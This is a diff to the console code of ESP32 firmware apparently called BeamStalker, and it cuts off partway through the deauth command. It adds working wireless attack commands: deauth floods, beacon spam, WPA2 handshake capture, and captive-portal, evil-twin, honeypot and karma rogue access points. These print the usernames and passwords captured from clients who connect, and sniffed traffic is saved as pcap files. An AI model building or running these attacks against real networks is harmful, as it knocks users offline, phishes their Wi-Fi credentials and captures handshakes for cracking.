@@ -60,6 +60,13 @@
 #  include "apps/wifi/wifi_deauth_svc.h"
 #  include "apps/wifi/wifi_beacon_svc.h"
 #  include "apps/wifi/wifi_sniffer_svc.h"
+#  include "apps/wifi/wifi_eapol_svc.h"
+#endif
+#if defined(BS_HAS_WIFI) && defined(BS_WIFI_ESP32) && defined(ARDUINO_ARCH_ESP32)
+#  include "apps/wifi/wifi_captive_svc.h"
+#  include "apps/wifi/wifi_eviltwin_svc.h"
+#  include "apps/wifi/wifi_honeypot_svc.h"
+#  include "apps/wifi/wifi_karma_svc.h"
 #endif
 #include "bs/bs_ble.h"    /* defines BS_HAS_BLE when a backend is active */
 #if defined(BS_HAS_BLE) && !defined(BS_NO_APP_BLE)
@@ -199,7 +206,7 @@ static int cmd_hw(struct konsole* ks, int argc, char** argv) {
 
     /* Storage */
     if (bs_fs_available()) {
-        long log_sz = bs_fs_file_size("system.log");
+        long log_sz = bs_fs_file_size(BS_PATH_LOG);
         if (log_sz >= 0)
             kon_printf(ks, "  SD    : mounted  log %ld B  [  OK  ]\r\n", log_sz);
         else
@@ -243,7 +250,7 @@ static int cmd_hw(struct konsole* ks, int argc, char** argv) {
 
 static int cmd_dmesg(struct konsole* ks, int argc, char** argv) {
     /* dmesg         - print in-memory log (boot to now)
-     * dmesg flush   - also write current ring to SD system.log */
+     * dmesg flush   - also write current ring to SD BeamStalker/system.log */
     bool do_flush = (argc >= 2 && strcmp(argv[1], "flush") == 0);
 
     bs_log_print_all(ks);
@@ -251,7 +258,7 @@ static int cmd_dmesg(struct konsole* ks, int argc, char** argv) {
     if (do_flush) {
         bs_log_flush_sd();
         if (bs_fs_available())
-            kon_printf(ks, "--- flushed to system.log ---\r\n");
+            kon_printf(ks, "--- flushed to BeamStalker/system.log ---\r\n");
         else
             kon_printf(ks, "--- no storage, flush skipped ---\r\n");
     }
@@ -329,19 +336,20 @@ static int cmd_startapp(struct konsole* ks, int argc, char** argv) {
  * hl_tick() is called from both menu_idle_poll (non-headless) and the
  * headless bs_run() loop — commands work on every build target.
  *
- * Commands:
- *   wifi                                        - show WiFi/attack status
- *   wifi beacon start [--mode random|custom]
- *                     [--prefix P] [--charset ascii|hi|kata|cyr] [--ch N]
- *   wifi beacon stop
- *   wifi deauth  start [--ch N]                 - broadcast flood
- *   wifi deauth  stop
- *   wifi sniff   start [--ch N]                 - passive capture, auto-hop if no --ch
- *   wifi sniff   stop
- *   ble spam start [--mode apple|samsung|google|name|all] [--ivl ms]
- *   ble spam stop
- *   ble scan start
- *   ble scan stop
+ * Commands (all block until q / Ctrl+C; use --help for full options):
+ *   wifi                          show WiFi/attack status
+ *   wifi scan    [--timeout N]    passive AP discovery (beacon+probe-resp sniff)
+ *   wifi beacon  [OPTIONS]        beacon spam, rotating channels
+ *   wifi deauth  [OPTIONS]        deauth flood — broadcast, targeted, or per-client
+ *   wifi deauth  scan             active AP scan (prints table, no attack)
+ *   wifi sniff   [OPTIONS]        passive capture, filters, pcap, --timeout N
+ *   wifi captive [OPTIONS]        rogue AP + captive portal      (ESP32 only)
+ *   wifi eapol   [OPTIONS]        WPA2 handshake capture + optional deauth trigger
+ *   wifi eviltwin [OPTIONS]       clone AP + deauth-triggered redirect chain (ESP32 only)
+ *   wifi honeypot [OPTIONS]       clone AP + CSA/deauth lures    (ESP32 only)
+ *   wifi karma   [OPTIONS]        probe-response rogue AP        (ESP32 only)
+ *   ble spam     [OPTIONS]        BLE advertisement flood
+ *   ble scan                      passive BLE device discovery
  */
 
 typedef enum {
@@ -349,6 +357,11 @@ typedef enum {
     HL_WIFI_BEACON,
     HL_WIFI_DEAUTH,
     HL_WIFI_SNIFF,
+    HL_WIFI_EAPOL,
+    HL_WIFI_CAPTIVE,    /* ESP32+Arduino only — portal-based features below */
+    HL_WIFI_EVILTWIN,
+    HL_WIFI_HONEYPOT,
+    HL_WIFI_KARMA,
     HL_BLE_SPAM,
     HL_BLE_SCAN,
 } hl_mode_t;
@@ -358,6 +371,27 @@ static struct konsole* s_hl_ks          = NULL;
 static uint32_t        s_hl_last_report = 0;
 static uint32_t        s_hl_last_total  = 0;  /* for delta reporting */
 static int             s_hl_last_log    = 0;  /* deauth log watermark */
+static int             s_hl_last_cred   = 0;  /* portal cred watermark */
+static int             s_hl_last_clients= 0;  /* portal client watermark */
+static int             s_hl_last_ssids  = 0;  /* karma SSID watermark */
+static uint32_t        s_hl_timeout_ms  = 0;  /* 0 = no timeout */
+
+/* Sniff session context — declared here so hl_stop/hl_tick can reference it */
+#ifdef BS_HAS_WIFI
+#define SNIFF_FTYPE_ALL  0xFF
+typedef struct {
+    struct konsole* ks;
+    bool            verbose;
+    uint8_t         filt_type;
+    uint8_t         filt_subtype;
+    bool            has_src;   uint8_t filt_src[6];
+    bool            has_dst;   uint8_t filt_dst[6];
+    bool            has_bssid; uint8_t filt_bssid[6];
+    bs_file_t       pcap_f;
+    uint32_t        pcap_count;
+} sniff_ctx_t;
+static sniff_ctx_t s_sniff_ctx;
+#endif /* BS_HAS_WIFI */
 
 /* Stop whatever is currently active */
 static void hl_stop(void) {
@@ -374,7 +408,42 @@ static void hl_stop(void) {
         case HL_WIFI_SNIFF:
             sniffer_svc_stop();
             bs_wifi_deinit();
+            if (s_sniff_ctx.pcap_f) {
+                bs_fs_close(s_sniff_ctx.pcap_f);
+                kon_printf(s_hl_ks ? s_hl_ks : &g_ks,
+                           "[sniff] pcap closed  %lu frames\r\n",
+                           (unsigned long)s_sniff_ctx.pcap_count);
+                s_sniff_ctx.pcap_f = NULL;
+            }
             break;
+        case HL_WIFI_EAPOL: {
+            uint32_t pcap_n = eapol_svc_pcap_frames();
+            eapol_svc_stop();
+            bs_wifi_deinit();
+            if (pcap_n > 0)
+                kon_printf(s_hl_ks ? s_hl_ks : &g_ks,
+                           "[eapol] pcap closed  %lu frames\r\n",
+                           (unsigned long)pcap_n);
+            break;
+        }
+#  if defined(BS_WIFI_ESP32) && defined(ARDUINO_ARCH_ESP32)
+        case HL_WIFI_CAPTIVE:
+            captive_svc_stop();
+            bs_wifi_deinit();
+            break;
+        case HL_WIFI_EVILTWIN:
+            eviltwin_svc_stop();
+            bs_wifi_deinit();
+            break;
+        case HL_WIFI_HONEYPOT:
+            honeypot_svc_stop();
+            bs_wifi_deinit();
+            break;
+        case HL_WIFI_KARMA:
+            karma_svc_stop();
+            bs_wifi_deinit();
+            break;
+#  endif /* BS_WIFI_ESP32 && ARDUINO_ARCH_ESP32 */
 #endif
 #ifdef BS_HAS_BLE
         case HL_BLE_SPAM:
@@ -388,11 +457,15 @@ static void hl_stop(void) {
 #endif
         default: break;
     }
-    s_hl_mode        = HL_IDLE;
-    s_hl_ks          = NULL;
-    s_hl_last_report = 0;
-    s_hl_last_total  = 0;
-    s_hl_last_log    = 0;
+    s_hl_mode         = HL_IDLE;
+    s_hl_ks           = NULL;
+    s_hl_last_report  = 0;
+    s_hl_last_total   = 0;
+    s_hl_last_log     = 0;
+    s_hl_last_cred    = 0;
+    s_hl_last_clients = 0;
+    s_hl_last_ssids   = 0;
+    s_hl_timeout_ms   = 0;
 }
 
 /* Ticked every loop iteration (both headless and menu idle) */
@@ -435,18 +508,158 @@ static void hl_tick(void) {
 
     if (s_hl_mode == HL_WIFI_SNIFF) {
         sniffer_svc_tick(now);
-        if (now - s_hl_last_report >= 3000) {
+        /* In verbose mode the pkt callback prints every frame; just show rate summary */
+        if (now - s_hl_last_report >= (s_sniff_ctx.verbose ? 10000u : 3000u)) {
             s_hl_last_report = now;
             uint32_t tot   = sniffer_svc_count();
             uint32_t delta = tot - s_hl_last_total;
             s_hl_last_total = tot;
-            kon_printf(s_hl_ks, "[sniff] total=%lu  +%lu/3s  ch=%u  drop=%lu\r\n",
+            kon_printf(s_hl_ks, "[sniff] total=%lu  +%lu  ch=%u  drop=%lu%s\r\n",
                        (unsigned long)tot, (unsigned long)delta,
                        (unsigned)sniffer_svc_channel(),
-                       (unsigned long)sniffer_svc_dropped());
+                       (unsigned long)sniffer_svc_dropped(),
+                       s_sniff_ctx.pcap_f ? "  [pcap]" : "");
         }
         return;
     }
+
+    if (s_hl_mode == HL_WIFI_EAPOL) {
+        eapol_svc_tick(now);
+        if (now - s_hl_last_report >= 3000) {
+            s_hl_last_report = now;
+            int  pairs = eapol_svc_pair_count();
+            if (pairs > s_hl_last_clients) {
+                /* New complete M1+M2 pair captured */
+                kon_printf(s_hl_ks,
+                    "[eapol] handshake captured!  pairs=%d  eapol=%lu  ch=%u\r\n",
+                    pairs, (unsigned long)eapol_svc_eapol_count(),
+                    (unsigned)sniffer_svc_channel());
+                s_hl_last_clients = pairs;
+            } else {
+                kon_printf(s_hl_ks,
+                    "[eapol] eapol=%lu  pairs=%d  ch=%u\r\n",
+                    (unsigned long)eapol_svc_eapol_count(),
+                    pairs, (unsigned)sniffer_svc_channel());
+            }
+        }
+        return;
+    }
+
+#  if defined(BS_WIFI_ESP32) && defined(ARDUINO_ARCH_ESP32)
+    /* ---- captive portal ---- */
+    if (s_hl_mode == HL_WIFI_CAPTIVE) {
+        captive_svc_tick(now);
+        int nl = captive_svc_client_count();
+        if (nl != s_hl_last_clients) {
+            kon_printf(s_hl_ks, nl > s_hl_last_clients
+                ? "[captive] client connected     total=%d\r\n"
+                : "[captive] client disconnected  total=%d\r\n", nl);
+            s_hl_last_clients = nl;
+        }
+        int nc = captive_svc_cred_count();
+        if (nc > s_hl_last_cred) {
+            for (int i = s_hl_last_cred; i < nc; i++) {
+                const wifi_portal_cred_t* c = captive_svc_get_cred(i);
+                if (c) kon_printf(s_hl_ks, "[captive] +cred #%d  user=\"%.32s\"  pass=\"%.32s\"\r\n",
+                                  i + 1, c->user, c->pass);
+            }
+            s_hl_last_cred = nc;
+        }
+        if (now - s_hl_last_report >= 30000) {
+            s_hl_last_report = now;
+            kon_printf(s_hl_ks, "[captive] running  clients=%d  creds=%d\r\n", nl, nc);
+        }
+        return;
+    }
+
+    /* ---- evil twin ---- */
+    if (s_hl_mode == HL_WIFI_EVILTWIN) {
+        eviltwin_svc_tick(now);
+        int nl = eviltwin_svc_client_count();
+        if (nl != s_hl_last_clients) {
+            kon_printf(s_hl_ks, nl > s_hl_last_clients
+                ? "[eviltwin] client connected     total=%d\r\n"
+                : "[eviltwin] client disconnected  total=%d\r\n", nl);
+            s_hl_last_clients = nl;
+        }
+        int nc = eviltwin_svc_cred_count();
+        if (nc > s_hl_last_cred) {
+            for (int i = s_hl_last_cred; i < nc; i++) {
+                const wifi_portal_cred_t* c = eviltwin_svc_get_cred(i);
+                if (c) kon_printf(s_hl_ks, "[eviltwin] +cred #%d  user=\"%.32s\"  pass=\"%.32s\"\r\n",
+                                  i + 1, c->user, c->pass);
+            }
+            s_hl_last_cred = nc;
+        }
+        if (now - s_hl_last_report >= 30000) {
+            s_hl_last_report = now;
+            kon_printf(s_hl_ks, "[eviltwin] running  clients=%d  creds=%d  deauth=%lu\r\n",
+                       nl, nc, (unsigned long)eviltwin_svc_deauth_total());
+        }
+        return;
+    }
+
+    /* ---- honeypot ---- */
+    if (s_hl_mode == HL_WIFI_HONEYPOT) {
+        honeypot_svc_tick(now);
+        int nl = honeypot_svc_client_count();
+        if (nl != s_hl_last_clients) {
+            kon_printf(s_hl_ks, nl > s_hl_last_clients
+                ? "[honeypot] client connected     total=%d\r\n"
+                : "[honeypot] client disconnected  total=%d\r\n", nl);
+            s_hl_last_clients = nl;
+        }
+        int nc = honeypot_svc_cred_count();
+        if (nc > s_hl_last_cred) {
+            for (int i = s_hl_last_cred; i < nc; i++) {
+                const wifi_portal_cred_t* c = honeypot_svc_get_cred(i);
+                if (c) kon_printf(s_hl_ks, "[honeypot] +cred #%d  user=\"%.32s\"  pass=\"%.32s\"\r\n",
+                                  i + 1, c->user, c->pass);
+            }
+            s_hl_last_cred = nc;
+        }
+        if (now - s_hl_last_report >= 30000) {
+            s_hl_last_report = now;
+            kon_printf(s_hl_ks, "[honeypot] running  clients=%d  creds=%d  lures=%lu\r\n",
+                       nl, nc, (unsigned long)honeypot_svc_lure_count());
+        }
+        return;
+    }
+
+    /* ---- karma ---- */
+    if (s_hl_mode == HL_WIFI_KARMA) {
+        karma_svc_tick(now);
+        int nl = karma_svc_client_count();
+        if (nl != s_hl_last_clients) {
+            kon_printf(s_hl_ks, nl > s_hl_last_clients
+                ? "[karma] client connected     total=%d\r\n"
+                : "[karma] client disconnected  total=%d\r\n", nl);
+            s_hl_last_clients = nl;
+        }
+        int nc = karma_svc_cred_count();
+        if (nc > s_hl_last_cred) {
+            for (int i = s_hl_last_cred; i < nc; i++) {
+                const wifi_portal_cred_t* c = karma_svc_get_cred(i);
+                if (c) kon_printf(s_hl_ks, "[karma] +cred #%d  user=\"%.32s\"  pass=\"%.32s\"\r\n",
+                                  i + 1, c->user, c->pass);
+            }
+            s_hl_last_cred = nc;
+        }
+        /* New SSIDs (auto mode) */
+        int ns = karma_svc_ssid_count();
+        if (ns > s_hl_last_ssids) {
+            kon_printf(s_hl_ks, "[karma] probe seen  total-ssids=%d  probes=%lu\r\n",
+                       ns, (unsigned long)karma_svc_probe_count());
+            s_hl_last_ssids = ns;
+        }
+        if (now - s_hl_last_report >= 30000) {
+            s_hl_last_report = now;
+            kon_printf(s_hl_ks, "[karma] running  clients=%d  creds=%d  ssids=%d  probes=%lu\r\n",
+                       nl, nc, ns, (unsigned long)karma_svc_probe_count());
+        }
+        return;
+    }
+#  endif /* BS_WIFI_ESP32 && ARDUINO_ARCH_ESP32 */
 #endif /* BS_HAS_WIFI */
 
 #ifdef BS_HAS_BLE
@@ -477,6 +690,233 @@ static void hl_tick(void) {
 #endif /* BS_HAS_BLE */
 }
 
+/*
+ * Run the active attack in the foreground, printing live stats until the user
+ * presses 'q', 'Q', Ctrl-C (0x03) or Ctrl-D (0x04).
+ * Calls hl_stop() before returning — caller always exits with mode == IDLE.
+ */
+static void hl_run_foreground(struct konsole* ks) {
+    if (s_hl_timeout_ms)
+        kon_printf(ks, "(q or Ctrl+C to stop  timeout: %lus)\r\n",
+                   (unsigned long)(s_hl_timeout_ms / 1000));
+    else
+        kon_printf(ks, "(q or Ctrl+C to stop)\r\n");
+    uint32_t t0 = s_arch->millis();
+    for (;;) {
+        uint8_t ibuf[8];
+        int n = s_arch->uart_read(0, ibuf, (int)sizeof(ibuf));
+        for (int i = 0; i < n; i++) {
+            if (ibuf[i] == 'q' || ibuf[i] == 'Q' ||
+                ibuf[i] == 0x03 || ibuf[i] == 0x04) {
+                hl_stop();
+                kon_printf(ks, "\r\n");
+                return;
+            }
+        }
+        if (s_hl_timeout_ms && (s_arch->millis() - t0) >= s_hl_timeout_ms) {
+            hl_stop();
+            kon_printf(ks, "[stopped: timeout]\r\n");
+            return;
+        }
+        hl_tick();
+        s_arch->delay_ms(10);
+    }
+}
+
+/* ---- Sniff packet callback helpers ------------------------------------ */
+#ifdef BS_HAS_WIFI
+
+static bool sniff_mac_eq(const uint8_t* a, const uint8_t* b) {
+    for (int i = 0; i < 6; i++) if (a[i] != b[i]) return false;
+    return true;
+}
+
+static bool sniff_parse_mac(const char* s, uint8_t mac[6]) {
+    int v[6] = {0};
+    if (sscanf(s, "%x:%x:%x:%x:%x:%x",
+               &v[0],&v[1],&v[2],&v[3],&v[4],&v[5]) == 6) {
+        for (int i = 0; i < 6; i++) mac[i] = (uint8_t)v[i];
+        return true;
+    }
+    return false;
+}
+
+static const char* sniff_fc_str(uint8_t fc0) {
+    uint8_t t = (fc0 >> 2) & 0x03, s = (fc0 >> 4) & 0x0F;
+    if (t == 0) {
+        switch (s) {
+            case 0:  return "assoc-req";   case 1: return "assoc-resp";
+            case 2:  return "reassoc-req"; case 3: return "reassoc-resp";
+            case 4:  return "probe-req";   case 5: return "probe-resp";
+            case 8:  return "beacon";      case 10: return "disassoc";
+            case 11: return "auth";        case 12: return "deauth";
+            default: return "mgmt";
+        }
+    }
+    if (t == 1) {
+        switch (s) {
+            case 10: return "ps-poll"; case 11: return "rts";
+            case 12: return "cts";     case 13: return "ack";
+            default: return "ctrl";
+        }
+    }
+    if (t == 2) {
+        switch (s) {
+            case 0: return "data"; case 4: return "null-data";
+            case 8: return "qos-data"; default: return "data";
+        }
+    }
+    return "ext";
+}
+
+static void sniff_hex_dump(struct konsole* ks, const uint8_t* d, uint16_t len) {
+    char line[80];
+    for (uint16_t off = 0; off < len; off += 16) {
+        uint16_t n = (len - off < 16) ? (len - off) : 16;
+        int p = 0;
+        p += snprintf(line+p, sizeof(line)-p, "  %04x  ", off);
+        for (uint16_t i = 0; i < 16; i++) {
+            if (i == 8) line[p++] = ' ';
+            if (i < n) p += snprintf(line+p, sizeof(line)-p, "%02x ", d[off+i]);
+            else       p += snprintf(line+p, sizeof(line)-p, "   ");
+        }
+        p += snprintf(line+p, sizeof(line)-p, " |");
+        for (uint16_t i = 0; i < n; i++) {
+            uint8_t c = d[off+i];
+            line[p++] = (c >= 0x20 && c < 0x7F) ? (char)c : '.';
+        }
+        line[p++] = '|'; line[p] = '\0';
+        kon_printf(ks, "%s\r\n", line);
+    }
+}
+
+static void sniff_pcap_open(const char* path) {
+    s_sniff_ctx.pcap_f = bs_fs_open(path, "w");
+    if (!s_sniff_ctx.pcap_f) return;
+    /* little-endian pcap global header: magic=0xa1b2c3d4  DLT_IEEE802_11=105 */
+    static const uint8_t k_hdr[24] = {
+        0xd4,0xc3,0xb2,0xa1,  /* magic */
+        0x02,0x00, 0x04,0x00, /* ver 2.4 */
+        0x00,0x00,0x00,0x00,  /* tz */
+        0x00,0x00,0x00,0x00,  /* sigfigs */
+        0xff,0xff,0x00,0x00,  /* snaplen 65535 */
+        0x69,0x00,0x00,0x00,  /* DLT_IEEE802_11 */
+    };
+    bs_fs_write(s_sniff_ctx.pcap_f, k_hdr, 24);
+    s_sniff_ctx.pcap_count = 0;
+}
+
+static void sniff_pcap_write_pkt(const uint8_t* data, uint16_t len, uint32_t ts_ms) {
+    if (!s_sniff_ctx.pcap_f) return;
+    uint32_t hdr[4];
+    hdr[0] = ts_ms / 1000;
+    hdr[1] = (ts_ms % 1000) * 1000;
+    hdr[2] = hdr[3] = (uint32_t)len;
+    bs_fs_write(s_sniff_ctx.pcap_f, hdr, 16);
+    bs_fs_write(s_sniff_ctx.pcap_f, data, len);
+    s_sniff_ctx.pcap_count++;
+}
+
+static void sniff_pkt_cb(const uint8_t* data, uint16_t len,
+                         int8_t rssi, uint32_t ts_ms, void* ctx) {
+    sniff_ctx_t* c = (sniff_ctx_t*)ctx;
+    if (len < 4) return;
+
+    uint8_t fc0  = data[0];
+    uint8_t type = (fc0 >> 2) & 0x03;
+    uint8_t sub  = (fc0 >> 4) & 0x0F;
+
+    /* frame-type filter */
+    if (c->filt_type != SNIFF_FTYPE_ALL) {
+        if (type != c->filt_type) return;
+        if (c->filt_subtype != SNIFF_FTYPE_ALL && sub != c->filt_subtype) return;
+    }
+
+    /* address filters — requires full 24B MAC header */
+    if (len >= 16) {
+        if (c->has_dst && !sniff_mac_eq(data + 4,  c->filt_dst))   return;
+        if (c->has_src && !sniff_mac_eq(data + 10, c->filt_src))   return;
+    }
+    if (len >= 22) {
+        if (c->has_bssid && !sniff_mac_eq(data + 16, c->filt_bssid)) return;
+    }
+
+    /* pcap write */
+    if (c->pcap_f) sniff_pcap_write_pkt(data, len, ts_ms);
+
+    /* verbose console output */
+    if (c->verbose) {
+        char m1[18]="?",m2[18]="?",m3[18]="?";
+        if (len >= 16) {
+            bs_wifi_bssid_str(data + 4,  m1);
+            bs_wifi_bssid_str(data + 10, m2);
+        }
+        if (len >= 22) bs_wifi_bssid_str(data + 16, m3);
+        kon_printf(c->ks, "[%s] len=%u rssi=%d ts=%lums\r\n"
+                          "  dst=%s  src=%s  bssid=%s\r\n",
+                   sniff_fc_str(fc0), (unsigned)len, (int)rssi,
+                   (unsigned long)ts_ms, m1, m2, m3);
+        sniff_hex_dump(c->ks, data, len);
+    }
+}
+
+/* ---- Passive scan accumulator (wifi scan) ----------------------------- */
+#define SCAN_MAX_APS 64
+typedef struct {
+    uint8_t bssid[6];
+    char    ssid[33];
+    uint8_t channel;
+    int8_t  rssi;
+    int     count;
+} scan_ap_t;
+static scan_ap_t s_scan_aps[SCAN_MAX_APS];
+static int       s_scan_ap_count;
+
+static void scan_beacon_cb(const uint8_t* data, uint16_t len,
+                            int8_t rssi, uint32_t ts_ms, void* ctx) {
+    (void)ts_ms; (void)ctx;
+    if (len < 38) return;
+    uint8_t fc0  = data[0];
+    uint8_t type = (fc0 >> 2) & 3;
+    uint8_t sub  = (fc0 >> 4) & 0xF;
+    /* Accept beacons (subtype 8) and probe responses (subtype 5) */
+    if (type != 0 || (sub != 8 && sub != 5)) return;
+    if (len < 22) return;
+    const uint8_t* bssid = data + 16;   /* Addr3 */
+    int idx = -1;
+    for (int i = 0; i < s_scan_ap_count; i++)
+        if (memcmp(s_scan_aps[i].bssid, bssid, 6) == 0) { idx = i; break; }
+    if (idx < 0) {
+        if (s_scan_ap_count >= SCAN_MAX_APS) return;
+        idx = s_scan_ap_count++;
+        memcpy(s_scan_aps[idx].bssid, bssid, 6);
+        s_scan_aps[idx].ssid[0] = '\0';
+        s_scan_aps[idx].channel = 0;
+        s_scan_aps[idx].count   = 0;
+    }
+    s_scan_aps[idx].rssi = rssi;
+    s_scan_aps[idx].count++;
+    /* Parse IEs: beacons and probe-resps both have 12B fixed fields after 24B MAC header */
+    int p = 36;
+    bool got_ssid = (s_scan_aps[idx].ssid[0] != '\0');
+    bool got_ch   = (s_scan_aps[idx].channel  != 0);
+    while (p + 2 <= (int)len && !(got_ssid && got_ch)) {
+        uint8_t id = data[p], ilen = data[p + 1];
+        if (p + 2 + ilen > (int)len) break;
+        if (!got_ssid && id == 0 && ilen > 0 && ilen <= 32) {
+            memcpy(s_scan_aps[idx].ssid, data + p + 2, ilen);
+            s_scan_aps[idx].ssid[ilen] = '\0';
+            got_ssid = true;
+        } else if (!got_ch && id == 3 && ilen == 1) {
+            s_scan_aps[idx].channel = data[p + 2];
+            got_ch = true;
+        }
+        p += 2 + ilen;
+    }
+}
+
+#endif /* BS_HAS_WIFI (sniff helpers) */
+
 /* ---- 'wifi' command ---------------------------------------------------- */
 #ifdef BS_HAS_WIFI
 static int cmd_wifi(struct konsole* ks, int argc, char** argv) {
@@ -505,138 +945,747 @@ static int cmd_wifi(struct konsole* ks, int argc, char** argv) {
                 kon_printf(ks, "Active: sniffer  %lu packets  ch=%u\r\n",
                            (unsigned long)sniffer_svc_count(),
                            (unsigned)sniffer_svc_channel()); break;
+            case HL_WIFI_EAPOL:
+                kon_printf(ks, "Active: eapol  eapol=%lu  pairs=%d  ch=%u\r\n",
+                           (unsigned long)eapol_svc_eapol_count(),
+                           eapol_svc_pair_count(),
+                           (unsigned)sniffer_svc_channel()); break;
+#if defined(BS_WIFI_ESP32) && defined(ARDUINO_ARCH_ESP32)
+            case HL_WIFI_CAPTIVE:
+                kon_printf(ks, "Active: captive portal  clients=%d  creds=%d\r\n",
+                           captive_svc_client_count(), captive_svc_cred_count()); break;
+            case HL_WIFI_EVILTWIN:
+                kon_printf(ks, "Active: evil twin  clients=%d  creds=%d  deauth=%lu\r\n",
+                           eviltwin_svc_client_count(), eviltwin_svc_cred_count(),
+                           (unsigned long)eviltwin_svc_deauth_total()); break;
+            case HL_WIFI_HONEYPOT:
+                kon_printf(ks, "Active: honeypot  clients=%d  creds=%d  lures=%lu\r\n",
+                           honeypot_svc_client_count(), honeypot_svc_cred_count(),
+                           (unsigned long)honeypot_svc_lure_count()); break;
+            case HL_WIFI_KARMA:
+                kon_printf(ks, "Active: karma  clients=%d  creds=%d  probes=%lu  ssids=%d\r\n",
+                           karma_svc_client_count(), karma_svc_cred_count(),
+                           (unsigned long)karma_svc_probe_count(),
+                           karma_svc_ssid_count()); break;
+#endif
             default:
                 kon_printf(ks, "Idle.\r\n"); break;
         }
         return 0;
     }
 
-    const char* sub  = argv[1];
-    const char* verb = (argc >= 3) ? argv[2] : "";
+    const char* sub = argv[1];
 
     /* ---- beacon ---- */
     if (bs_stricmp(sub, "beacon") == 0) {
-        if (bs_stricmp(verb, "stop") == 0) {
-            if (s_hl_mode == HL_WIFI_BEACON) { hl_stop(); kon_printf(ks, "Beacon spam stopped.\r\n"); }
-            else kon_printf(ks, "Not running.\r\n");
+        bool want_help = false;
+        for (int i = 2; i < argc && !want_help; i++)
+            if (!strcmp(argv[i],"--help") || !strcmp(argv[i],"-h")) want_help = true;
+        if (want_help) {
+            kon_printf(ks,
+                "wifi beacon [OPTIONS]\r\n"
+                "  Flood the air with spoofed beacon frames on rotating channels.\r\n"
+                "Options:\r\n"
+                "  --mode  random|custom|file   SSID source (default: random)\r\n"
+                "  --prefix NAME                fixed SSID prefix (implies custom mode)\r\n");
+            kon_printf(ks,
+                "  --charset ascii|hi|kata|cyr  SSID character set (default: ascii)\r\n"
+                "  --repeat N                   TX bursts per SSID 1-20 (default: 3)\r\n"
+                "  Channels rotate randomly; no fixed channel option.\r\n"
+                "  Press q / Ctrl+C to stop.\r\n");
             return 0;
         }
-        if (bs_stricmp(verb, "start") == 0) {
-            if (s_hl_mode != HL_IDLE) hl_stop();
-            if (bs_wifi_init(s_arch) < 0) { kon_printf(ks, "WiFi init failed.\r\n"); return 1; }
-            /* Parse options */
-            beacon_svc_mode_t  mode    = BEACON_MODE_RANDOM;
-            wifi_charset_t     charset = WIFI_CHARSET_ASCII;
-            char               prefix[21] = "testAP";
-            int                repeat  = 3;
-            uint8_t            channel = 6;
-            for (int i = 3; i < argc - 1; i++) {
-                if (strcmp(argv[i], "--mode") == 0 && i+1 < argc) {
-                    if (strcmp(argv[i+1], "custom") == 0) mode = BEACON_MODE_CUSTOM;
-                    else if (strcmp(argv[i+1], "file") == 0) mode = BEACON_MODE_FILE;
-                    i++;
-                } else if (strcmp(argv[i], "--prefix") == 0 && i+1 < argc) {
-                    strncpy(prefix, argv[i+1], sizeof prefix - 1);
-                    mode = BEACON_MODE_CUSTOM; i++;
-                } else if (strcmp(argv[i], "--charset") == 0 && i+1 < argc) {
-                    if      (strcmp(argv[i+1],"hi")   == 0) charset = WIFI_CHARSET_HIRAGANA;
-                    else if (strcmp(argv[i+1],"kata") == 0) charset = WIFI_CHARSET_KATAKANA;
-                    else if (strcmp(argv[i+1],"cyr")  == 0) charset = WIFI_CHARSET_CYRILLIC;
-                    i++;
-                } else if (strcmp(argv[i], "--ch") == 0 && i+1 < argc) {
-                    int ch = atoi(argv[i+1]);
-                    if (ch >= 1 && ch <= 13) channel = (uint8_t)ch;
-                    i++;
-                } else if (strcmp(argv[i], "--repeat") == 0 && i+1 < argc) {
-                    repeat = atoi(argv[i+1]); i++;
-                }
+        if (s_hl_mode != HL_IDLE) hl_stop();
+        if (bs_wifi_init(s_arch) < 0) { kon_printf(ks, "WiFi init failed.\r\n"); return 1; }
+        beacon_svc_mode_t  mode    = BEACON_MODE_RANDOM;
+        wifi_charset_t     charset = WIFI_CHARSET_ASCII;
+        char               prefix[21] = "testAP";
+        int                repeat  = 3;
+        for (int i = 2; i < argc; i++) {
+            if (!strcmp(argv[i],"--mode") && i+1<argc) {
+                if      (!strcmp(argv[i+1],"custom")) mode=BEACON_MODE_CUSTOM;
+                else if (!strcmp(argv[i+1],"file"))   mode=BEACON_MODE_FILE;
+                else                                  mode=BEACON_MODE_RANDOM;
+                i++;
+            } else if (!strcmp(argv[i],"--prefix") && i+1<argc) {
+                strncpy(prefix,argv[i+1],sizeof prefix-1); prefix[sizeof prefix-1]='\0';
+                mode=BEACON_MODE_CUSTOM; i++;
+            } else if (!strcmp(argv[i],"--charset") && i+1<argc) {
+                if      (!strcmp(argv[i+1],"hi"))   charset=WIFI_CHARSET_HIRAGANA;
+                else if (!strcmp(argv[i+1],"kata")) charset=WIFI_CHARSET_KATAKANA;
+                else if (!strcmp(argv[i+1],"cyr"))  charset=WIFI_CHARSET_CYRILLIC;
+                else                                charset=WIFI_CHARSET_ASCII;
+                i++;
+            } else if (!strcmp(argv[i],"--repeat") && i+1<argc) {
+                int r=atoi(argv[i+1]); if(r>=1&&r<=20) repeat=r; i++;
+            } else {
+                kon_printf(ks,"Unknown argument: %s  (run with --help)\r\n",argv[i]); return 1;
             }
-            beacon_svc_init(s_arch);
-            beacon_svc_start(mode, charset, prefix, repeat, NULL, 0);
-            /* Seed the channel (service picks random; override if user specified) */
-            (void)channel;  /* service picks per-beacon random channel */
-            s_hl_mode = HL_WIFI_BEACON;
-            s_hl_ks   = ks;
-            s_hl_last_report = 0;
-            kon_printf(ks, "Beacon spam started (mode=%s).\r\n"
-                           "Reports every 5 s.  'wifi beacon stop' to halt.\r\n",
-                       mode == BEACON_MODE_CUSTOM ? "custom" :
-                       mode == BEACON_MODE_FILE   ? "file"   : "random");
-            return 0;
         }
-        kon_printf(ks, "Usage: wifi beacon start|stop [--mode random|custom|file] "
-                       "[--prefix P] [--charset ascii|hi|kata|cyr] [--repeat N]\r\n");
+        beacon_svc_init(s_arch);
+        beacon_svc_start(mode, charset, prefix, repeat, NULL, 0);
+        s_hl_mode=HL_WIFI_BEACON; s_hl_ks=ks; s_hl_last_report=0;
+        kon_printf(ks,"[beacon] mode=%s  charset=%s  repeat=%d\r\n",
+                   mode==BEACON_MODE_CUSTOM?"custom":mode==BEACON_MODE_FILE?"file":"random",
+                   k_wifi_charset_names[charset], repeat);
+        hl_run_foreground(ks);
         return 0;
     }
 
     /* ---- deauth ---- */
     if (bs_stricmp(sub, "deauth") == 0) {
-        if (bs_stricmp(verb, "stop") == 0) {
-            if (s_hl_mode == HL_WIFI_DEAUTH) { hl_stop(); kon_printf(ks, "Deauth stopped.\r\n"); }
